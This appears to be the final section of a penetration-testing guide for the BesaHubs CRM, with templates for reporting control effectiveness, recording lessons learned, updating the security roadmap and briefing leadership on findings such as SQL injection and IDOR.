
### Authentication Controls
| Control | Effectiveness | Evidence |
|---------|---------------|----------|
| Account Lockout | ✅ Effective | 0 brute force successes in 10,000 attempts |
| MFA Enforcement | ✅ Effective | 100% of Admin/Manager accounts use MFA |
| Password Policy | ⚠️ Partial | 15% of users still using weak passwords (legacy) |

### Authorization Controls
| Control | Effectiveness | Evidence |
|---------|---------------|----------|
| RBAC Permissions | ✅ Effective | 0 privilege escalations detected |
| IDOR Prevention | ❌ Ineffective | 3 IDOR vulnerabilities found |

### Recommendations:
1. Force password reset for legacy weak passwords
2. Implement UUID-based resource identifiers to prevent IDOR
3. Add additional authorization checks at API gateway level
```

### 4. Lessons Learned Documentation

**Template:**

```markdown
# Penetration Test Lessons Learned - [Date]

## What Went Well
1. **Automated SAST/DAST caught 60% of vulnerabilities before pentest**
   - Action: Continue weekly automated scans
   
2. **Incident response team responded within SLA**
   - Action: Document response process for future tests

## What Needs Improvement
1. **SQL injection vulnerabilities still present despite code review**
   - Root Cause: Developers not trained on Sequelize secure patterns
   - Action: Mandatory secure coding training for all backend developers
   
2. **Lack of input validation on new endpoints**
   - Root Cause: No validation checklist in PR template
   - Action: Add security checklist to PR template

## Action Items
- [ ] Schedule secure coding training (Due: 2025-10-15)
- [ ] Update PR template with security checklist (Due: 2025-10-10)
- [ ] Implement pre-commit hooks for security linting (Due: 2025-10-20)
- [ ] Add Sequelize security patterns to developer docs (Due: 2025-10-12)

## Metrics
- **Vulnerabilities Found:** 15 (Critical: 2, High: 5, Medium: 6, Low: 2)
- **Time to Fix Critical:** Average 3.5 days (Target: <7 days) ✅
- **Re-Test Pass Rate:** 80% (12/15 fixed on first re-test)
```

### 5. Security Roadmap Update

**Update Security Roadmap Based on Findings:**

```markdown
# Updated Security Roadmap - Post Penetration Test

## Immediate (0-30 days)
- [x] Fix critical SQL injection vulnerabilities
- [ ] Implement WAF with OWASP Core Rule Set
- [ ] Deploy automated secret scanning in CI/CD
- [ ] Enable database query logging and monitoring

## Short-term (1-3 months)
- [ ] Implement Content Security Policy (CSP) Level 3
- [ ] Deploy API rate limiting at gateway level
- [ ] Implement automated dependency vulnerability scanning
- [ ] Conduct security training for all developers

## Medium-term (3-6 months)
- [ ] Implement zero-trust network architecture
- [ ] Deploy SIEM with automated alerting
- [ ] Establish bug bounty program
- [ ] Achieve SOC 2 Type II certification

## Long-term (6-12 months)
- [ ] Implement runtime application self-protection (RASP)
- [ ] Deploy behavioral analytics for anomaly detection
- [ ] Establish red team / blue team exercises (quarterly)
- [ ] Achieve ISO 27001 certification
```

### 6. Stakeholder Communication

**Executive Summary Email Template:**

```
Subject: Penetration Test Results - [Date] - Action Required

Dear Leadership Team,

Our recent penetration test (conducted [START_DATE] - [END_DATE]) has been completed. 

KEY FINDINGS:
✅ GOOD NEWS: Our authentication and encryption controls are strong
⚠️ ACTION NEEDED: 2 critical vulnerabilities require immediate remediation

CRITICAL ISSUES (Fix within 7 days):
1. SQL Injection in authentication endpoint - Could allow account takeover
2. Broken access control in user management - Could allow privilege escalation

REMEDIATION PLAN:
- Critical fixes: Deployed by [DATE]
- High-priority fixes: Deployed by [DATE]  
- Security training: Scheduled for [DATE]

BUSINESS IMPACT:
- No evidence of active exploitation
- No customer data compromised
- Proactive fixes will strengthen security posture

Full technical report attached. Security team is available for questions.

Next Steps:
1. Review detailed findings (attached)
2. Approve remediation budget if needed
3. Schedule executive briefing if desired

Thank you,
[Security Team Lead]
```

---

## Conclusion

This penetration testing guide provides a comprehensive framework for assessing the security of BesaHubs CRM. Regular testing (quarterly recommended) ensures continuous security improvement and helps maintain compliance with industry standards.

**Remember:**
- Always get written authorization before testing
- Follow responsible disclosure practices
- Document everything thoroughly
- Treat all findings as confidential until remediated
- Focus on helping the development team improve, not just finding flaws

**Questions or Issues:**
Contact the security team at security@besahubs.com or via Slack #security-team.

---

*Document Version: 1.0*  
*Last Updated: October 1, 2025*  
*Next Review: January 1, 2026*
